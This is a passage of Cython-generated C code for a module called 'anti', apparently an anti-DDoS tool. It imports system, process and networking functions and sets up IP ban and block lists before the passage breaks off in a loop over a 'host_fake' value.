            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_kill); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_kill, __pyx_t_5) < 0) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_getpid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_getpid, __pyx_t_5) < 0) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_name_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_name_2, __pyx_t_5) < 0) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_system, __pyx_t_5) < 0) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_remove); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_remove, __pyx_t_5) < 0) __PYX_ERR(0, 201, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 202, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__51, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 202, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 203, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__52, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 203, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_clear); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 204, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 204, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        {
            __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_6);
            __Pyx_XGOTREF(__pyx_t_8);
            __Pyx_XGOTREF(__pyx_t_7);
            __Pyx_XGOTREF(__pyx_t_6); {
                __pyx_t_5 = PyList_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 206, __pyx_L17_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_INCREF(__pyx_n_s__53);
                __Pyx_GIVEREF(__pyx_n_s__53);
                PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s__53);
                __pyx_t_1 = __Pyx_Import(__pyx_n_s_config, __pyx_t_5, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 206, __pyx_L17_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (__pyx_import_star(__pyx_t_1) < 0) __PYX_ERR(0, 206, __pyx_L17_error);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            }
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            goto __pyx_L22_try_end;
        __pyx_L17_error:;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0; {
                __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_5, &__pyx_t_3) < 0) __PYX_ERR(0, 207, __pyx_L19_except_error)
                    __Pyx_GOTREF(__pyx_t_1);
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_GOTREF(__pyx_t_3);
                __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 208, __pyx_L19_except_error)
                    __Pyx_GOTREF(__pyx_t_11);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __pyx_t_11 = __Pyx_PyObject_CallNoArg(__pyx_builtin_input); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 209, __pyx_L19_except_error)
                    __Pyx_GOTREF(__pyx_t_11);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_sys); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 210, __pyx_L19_except_error)
                    __Pyx_GOTREF(__pyx_t_11);
                __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_exit); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 210, __pyx_L19_except_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __pyx_t_11 = __Pyx_PyObject_CallNoArg(__pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 210, __pyx_L19_except_error)
                    __Pyx_GOTREF(__pyx_t_11);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                goto __pyx_L18_exception_handled;
            }
        __pyx_L19_except_error:;
            __Pyx_XGIVEREF(__pyx_t_8);
            __Pyx_XGIVEREF(__pyx_t_7);
            __Pyx_XGIVEREF(__pyx_t_6);
            __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
            goto __pyx_L1_error;
        __pyx_L18_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_8);
            __Pyx_XGIVEREF(__pyx_t_7);
            __Pyx_XGIVEREF(__pyx_t_6);
            __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
        __pyx_L22_try_end:;
        }
        __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 211, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_INCREF(__pyx_n_s_unquote);
        __Pyx_GIVEREF(__pyx_n_s_unquote);
        PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s_unquote);
        __pyx_t_5 = __Pyx_Import(__pyx_n_s_urllib_parse, __pyx_t_3, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 211, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_unquote); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 211, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_unquote, __pyx_t_3) < 0) __PYX_ERR(0, 211, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyList_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 212, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_n_s_Popen);
        __Pyx_GIVEREF(__pyx_n_s_Popen);
        PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s_Popen);
        __Pyx_INCREF(__pyx_n_s_PIPE);
        __Pyx_GIVEREF(__pyx_n_s_PIPE);
        PyList_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_PIPE);
        __pyx_t_3 = __Pyx_Import(__pyx_n_s_subprocess, __pyx_t_5, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 212, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_Popen); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 212, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_Popen, __pyx_t_5) < 0) __PYX_ERR(0, 212, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 212, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_PIPE, __pyx_t_5) < 0) __PYX_ERR(0, 212, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 213, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_INCREF(__pyx_n_s_sleep);
        __Pyx_GIVEREF(__pyx_n_s_sleep);
        PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s_sleep);
        __pyx_t_5 = __Pyx_Import(__pyx_n_s_time, __pyx_t_3, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 213, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_sleep); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 213, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_sleep, __pyx_t_3) < 0) __PYX_ERR(0, 213, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyList_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 214, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_INCREF(__pyx_n_s_Thread);
        __Pyx_GIVEREF(__pyx_n_s_Thread);
        PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s_Thread);
        __pyx_t_3 = __Pyx_Import(__pyx_n_s_threading, __pyx_t_5, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 214, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_Thread); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 214, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_Thread, __pyx_t_5) < 0) __PYX_ERR(0, 214, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 215, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_INCREF(__pyx_n_s_choice);
        __Pyx_GIVEREF(__pyx_n_s_choice);
        PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s_choice);
        __pyx_t_5 = __Pyx_Import(__pyx_n_s_random, __pyx_t_3, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 215, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_5, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 215, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_choice, __pyx_t_3) < 0) __PYX_ERR(0, 215, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_Import(__pyx_n_s_socket, 0, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 216, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_socket, __pyx_t_5) < 0) __PYX_ERR(0, 216, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_Import(__pyx_n_s_signal, 0, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 216, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_signal, __pyx_t_5) < 0) __PYX_ERR(0, 216, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        {
            __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
            __Pyx_XGOTREF(__pyx_t_6);
            __Pyx_XGOTREF(__pyx_t_7);
            __Pyx_XGOTREF(__pyx_t_8); {
                __pyx_t_5 = PyList_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 218, __pyx_L25_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_INCREF(__pyx_n_s_DEVNULL);
                __Pyx_GIVEREF(__pyx_n_s_DEVNULL);
                PyList_SET_ITEM(__pyx_t_5, 0, __pyx_n_s_DEVNULL);
                __pyx_t_3 = __Pyx_Import(__pyx_n_s_subprocess, __pyx_t_5, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 218, __pyx_L25_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_DEVNULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 218, __pyx_L25_error)
                    __Pyx_GOTREF(__pyx_t_5);
                if (PyDict_SetItem(__pyx_d, __pyx_n_s_DEVNULL, __pyx_t_5) < 0) __PYX_ERR(0, 218, __pyx_L25_error)
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
            goto __pyx_L30_try_end;
        __pyx_L25_error:;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ImportError);
            if (__pyx_t_12) {
                __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_5, &__pyx_t_1) < 0) __PYX_ERR(0, 219, __pyx_L27_except_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __Pyx_GOTREF(__pyx_t_5);
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_11 = PyList_New(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 220, __pyx_L27_except_error)
                    __Pyx_GOTREF(__pyx_t_11);
                __Pyx_INCREF(__pyx_n_s_devnull);
                __Pyx_GIVEREF(__pyx_n_s_devnull);
                PyList_SET_ITEM(__pyx_t_11, 0, __pyx_n_s_devnull);
                __pyx_t_4 = __Pyx_Import(__pyx_n_s_os, __pyx_t_11, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 220, __pyx_L27_except_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __pyx_t_11 = __Pyx_ImportFrom(__pyx_t_4, __pyx_n_s_devnull); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 220, __pyx_L27_except_error)
                    __Pyx_GOTREF(__pyx_t_11);
                if (PyDict_SetItem(__pyx_d, __pyx_n_s_devnull, __pyx_t_11) < 0) __PYX_ERR(0, 220, __pyx_L27_except_error)
                    __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_devnull); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 221, __pyx_L27_except_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_11 = PyTuple_New(2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 221, __pyx_L27_except_error)
                    __Pyx_GOTREF(__pyx_t_11);
                __Pyx_GIVEREF(__pyx_t_4);
                PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_4);
                __Pyx_INCREF(__pyx_n_u_wb);
                __Pyx_GIVEREF(__pyx_n_u_wb);
                PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_n_u_wb);
                __pyx_t_4 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_11, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 221, __pyx_L27_except_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
                if (PyDict_SetItem(__pyx_d, __pyx_n_s_DEVNULL, __pyx_t_4) < 0) __PYX_ERR(0, 221, __pyx_L27_except_error)
                    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                goto __pyx_L26_exception_handled;
            }
            goto __pyx_L27_except_error;
        __pyx_L27_except_error:;
            __Pyx_XGIVEREF(__pyx_t_6);
            __Pyx_XGIVEREF(__pyx_t_7);
            __Pyx_XGIVEREF(__pyx_t_8);
            __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
            goto __pyx_L1_error;
        __pyx_L26_exception_handled:;
            __Pyx_XGIVEREF(__pyx_t_6);
            __Pyx_XGIVEREF(__pyx_t_7);
            __Pyx_XGIVEREF(__pyx_t_8);
            __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
        __pyx_L30_try_end:;
        }
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_getpid); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 223, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 223, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_pid, __pyx_t_5) < 0) __PYX_ERR(0, 223, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 224, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_ddos, __pyx_t_5) < 0) __PYX_ERR(0, 224, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyList_New(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 225, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_block, __pyx_t_5) < 0) __PYX_ERR(0, 225, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyList_New(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 226, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_blockk, __pyx_t_5) < 0) __PYX_ERR(0, 226, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ban_ip); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 227, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 227, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyUnicode_Replace(((PyObject*)__pyx_t_1), __pyx_kp_u_32, __pyx_kp_u__7, -1L); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 227, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_list_ban_ip, __pyx_t_5) < 0) __PYX_ERR(0, 227, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 228, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_d, __pyx_n_s_force_block, __pyx_t_5) < 0) __PYX_ERR(0, 228, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_name_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 229, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_n_u_nt, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 229, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (__pyx_t_2) {
            {
                __Pyx_PyThreadState_declare
                    __Pyx_PyThreadState_assign
                    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_6);
                __Pyx_XGOTREF(__pyx_t_8);
                __Pyx_XGOTREF(__pyx_t_7);
                __Pyx_XGOTREF(__pyx_t_6); {
                    {
                        __pyx_t_5 = PyList_New(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 231, __pyx_L43_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_host_fake); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L43_error)
                            __Pyx_GOTREF(__pyx_t_3);
                        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_split); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 231, __pyx_L43_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                        __pyx_t_3 = NULL;
                        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
                            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
                            if (likely(__pyx_t_3)) {
                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                                __Pyx_INCREF(__pyx_t_3);
                                __Pyx_INCREF(function);
                                __Pyx_DECREF_SET(__pyx_t_4, function);
                            }
                        }
                        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_kp_u__55) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u__55);
                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L43_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
                            __pyx_t_4 = __pyx_t_1; __Pyx_INCREF(__pyx_t_4); __pyx_t_9 = 0;
                            __pyx_t_10 = NULL;
                        }
                        else {
                            __pyx_t_9 = -1; __pyx_t_4 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 231, __pyx_L43_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __pyx_t_10 = Py_TYPE(__pyx_t_4)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 231, __pyx_L43_error)
                        }
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        for (;;) {
                            if (likely(!__pyx_t_10)) {
                                if (likely(PyList_CheckExact(__pyx_t_4))) {
                                    if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_4)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                    __pyx_t_1 = PyList_GET_ITEM(__pyx_t_4, __pyx_t_9); __Pyx_INCREF(__pyx_t_1); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 231, __pyx_L43_error)
#else
                                    __pyx_t_1 = PySequence_ITEM(__pyx_t_4, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L43_error)
                                        __Pyx_GOTREF(__pyx_t_1);
#endif
                                }
                                else {
                                    if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_4)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                                    __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_4, __pyx_t_9); __Pyx_INCREF(__pyx_t_1); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 231, __pyx_L43_error)
#else
                                    __pyx_t_1 = PySequence_ITEM(__pyx_t_4, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L43_error)
                                        __Pyx_GOTREF(__pyx_t_1);
#endif
                                }
                            }
                            else {
                                __pyx_t_1 = __pyx_t_10(__pyx_t_4);
                                if (unlikely(!__pyx_t_1)) {
                                    PyObject* exc_type = PyErr_Occurred();
                                    if (exc_type) {
